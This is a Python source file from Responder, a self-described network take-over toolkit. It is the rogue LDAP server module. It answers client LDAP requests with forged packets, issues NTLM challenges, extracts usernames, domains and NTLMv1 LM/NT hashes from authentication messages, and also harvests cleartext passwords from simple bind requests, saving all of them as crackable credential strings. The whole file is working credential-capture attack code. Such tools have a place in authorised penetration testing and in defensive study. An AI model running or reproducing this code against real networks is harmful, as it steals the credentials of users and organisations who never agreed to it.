#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
from SocketServer import BaseRequestHandler
from packets import LDAPSearchDefaultPacket, LDAPSearchSupportedCapabilitiesPacket, LDAPSearchSupportedMechanismsPacket, LDAPNTLMChallenge
from utils import *
import struct

def ParseSearch(data):
	if re.search(r'(objectClass)', data):
		return str(LDAPSearchDefaultPacket(MessageIDASNStr=data[8:9]))
	elif re.search(r'(?i)(objectClass0*.*supportedCapabilities)', data):
		return str(LDAPSearchSupportedCapabilitiesPacket(MessageIDASNStr=data[8:9],MessageIDASN2Str=data[8:9]))
	elif re.search(r'(?i)(objectClass0*.*supportedSASLMechanisms)', data):
		return str(LDAPSearchSupportedMechanismsPacket(MessageIDASNStr=data[8:9],MessageIDASN2Str=data[8:9]))

def ParseLDAPHash(data, client, Challenge):
	SSPIStart = data[42:]
	LMhashLen = struct.unpack('<H',data[54:56])[0]

	if LMhashLen > 10:
		LMhashOffset = struct.unpack('<H',data[58:60])[0]
		LMHash       = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
		
		NthashLen    = struct.unpack('<H',data[64:66])[0]
		NthashOffset = struct.unpack('<H',data[66:68])[0]
		NtHash       = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
		
		DomainLen    = struct.unpack('<H',data[72:74])[0]
		DomainOffset = struct.unpack('<H',data[74:76])[0]
		Domain       = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
		
		UserLen      = struct.unpack('<H',data[80:82])[0]
		UserOffset   = struct.unpack('<H',data[82:84])[0]
		User         = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')

		WriteHash    = User + "::" + Domain + ":" + LMHash + ":" + NtHash + ":" + Challenge.encode('hex')

		SaveToDb({
			'module': 'LDAP',
			'type': 'NTLMv1',
			'client': client,
			'user': Domain+'\\'+User,
			'hash': NtHash,
			'fullhash': WriteHash,
		})
	
	if LMhashLen < 2 and settings.Config.Verbose:
		print text("[LDAP] Ignoring anonymous NTLM authentication")

def ParseNTLM(data,client, Challenge):
	if re.search('(NTLMSSP\x00\x01\x00\x00\x00)', data):
		NTLMChall = LDAPNTLMChallenge(MessageIDASNStr=data[8:9],NTLMSSPNtServerChallenge=Challenge)
		NTLMChall.calculate()
		return str(NTLMChall)
	elif re.search('(NTLMSSP\x00\x03\x00\x00\x00)', data):
		ParseLDAPHash(data, client, Challenge)

def ParseLDAPPacket(data, client, Challenge):
	if data[1:2] == '\x84':
		PacketLen        = struct.unpack('>i',data[2:6])[0]
		MessageSequence  = struct.unpack('<b',data[8:9])[0]
		Operation        = data[9:10]
		sasl             = data[20:21]
		OperationHeadLen = struct.unpack('>i',data[11:15])[0]
		LDAPVersion      = struct.unpack('<b',data[17:18])[0]
		
		if Operation == "\x60":
			UserDomainLen  = struct.unpack('<b',data[19:20])[0]
			UserDomain     = data[20:20+UserDomainLen]
			AuthHeaderType = data[20+UserDomainLen:20+UserDomainLen+1]

			if AuthHeaderType == "\x80":
				PassLen   = struct.unpack('<b',data[20+UserDomainLen+1:20+UserDomainLen+2])[0]
				Password  = data[20+UserDomainLen+2:20+UserDomainLen+2+PassLen]
				SaveToDb({
					'module': 'LDAP',
					'type': 'Cleartext',
					'client': client,
					'user': UserDomain,
					'cleartext': Password,
					'fullhash': UserDomain+':'+Password,
				})
			
			if sasl == "\xA3":
				Buffer = ParseNTLM(data,client, Challenge)
				return Buffer
		
		elif Operation == "\x63":
			Buffer = ParseSearch(data)
			return Buffer

		elif settings.Config.Verbose:
			print text('[LDAP] Operation not supported')

	if data[5:6] == '\x60':
                UserLen = struct.unpack("<b",data[11:12])[0]
                UserString = data[12:12+UserLen]
                PassLen = struct.unpack("<b",data[12+UserLen+1:12+UserLen+2])[0]
                PassStr = data[12+UserLen+2:12+UserLen+3+PassLen]
                if settings.Config.Verbose:
			print text('[LDAP] Attempting to parse an old simple Bind request.')
		SaveToDb({
			'module': 'LDAP',
			'type': 'Cleartext',
			'client': client,
			'user': UserString,
			'cleartext': PassStr,
			'fullhash': UserString+':'+PassStr,
			})

class LDAP(BaseRequestHandler):
	def handle(self):
		try:
			self.request.settimeout(0.4)
			data = self.request.recv(8092)
                        Challenge = RandomChallenge()
                        for x in range(5):
				Buffer = ParseLDAPPacket(data,self.client_address[0], Challenge)
				if Buffer:
					self.request.send(Buffer)
				data = self.request.recv(8092)
		except:
                        pass

